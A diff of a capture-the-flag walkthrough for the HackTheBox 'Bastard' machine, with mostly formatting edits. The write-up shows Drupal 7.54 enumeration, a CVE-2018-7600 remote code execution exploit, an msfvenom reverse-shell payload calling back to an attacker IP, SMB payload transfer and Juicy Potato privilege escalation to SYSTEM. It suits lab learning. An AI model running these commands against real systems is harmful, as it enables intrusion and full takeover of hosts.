@@ -1,7 +1,12 @@
-# Bastard 
+---
+icon: flag
+---
+
+# bastard
+
 ## Enumeration
 
-Starting with a nmap scan I find three open ports 
+Starting with a nmap scan I find three open ports
 
 ```bash
 $ sudo nmap -sS -p- --open -n -Pn --min-rate=5000 10.10.10.9 -oG allPorts -vvvv
@@ -13,10 +18,10 @@ PORT      STATE SERVICE REASON
 
 Visiting the port 80 I find a drupal login panel
 
-![Desktop View](/img/htb/bastard/drupal_login_1.png)
-
+![Desktop View](../../img/htb/bastard/drupal_login_1.png)
 
 doing a curl to the changelog.txt I'm able to enumerate the version which in this case is 7.54
+
 ```bash
 $ curl -s -X GET http://10.10.10.9/CHANGELOG.txt  | head
 
@@ -24,9 +29,9 @@ Drupal 7.54, 2017-02-01
 -----------------------
 ```
 
-## shell as iusr 
+## shell as iusr
 
-searching for some exploits I find this [CVE-2018-7600](https://github.com/pimps/CVE-2018-7600) that allows me to get remote command execution on the machine 
+searching for some exploits I find this [CVE-2018-7600](https://github.com/pimps/CVE-2018-7600) that allows me to get remote command execution on the machine
 
 ```bash
 $ python drupa7-CVE-2018-7600.py -c 'whoami' http://10.10.10.9/
@@ -68,13 +73,13 @@ PS C:\inetpub\drupal-7.54>
 
 ## shell as nt authority\system
 
-I create a shell.exe file with msfvenom that will give me a reverse shell 
+I create a shell.exe file with msfvenom that will give me a reverse shell
 
 ```shell
 $ msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.13 lport=9001 -f exe -o shell.exe
 ```
 
-I download juicy potato and the shell.exe executable files into the target machine 
+I download juicy potato and the shell.exe executable files into the target machine
 
 ```sh
 PS C:\windows\temp\x> copy \\10.10.14.13\smbfolder\shell.exe . 
@@ -90,6 +95,7 @@ COM -> recv failed with error: 10038
 ```
 
 The reason is that the clsid is wrong so I look for a valid one [here](https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2008_R2_Enterprise) I retry the exploit two times until it gives an "OK" response
+
 ```shell
 PS C:\windows\temp\x> .\jp.exe -t * -l 1337 -p ".\shell.exe" -c "{C49E32C6-BC8B-11d2-85D4-00105A1F8304}"
 Testing {C49E32C6-BC8B-11d2-85D4-00105A1F8304} 1337
@@ -119,5 +125,3 @@ nt authority\system
 
 C:\Windows\system32>
 ```
-
-
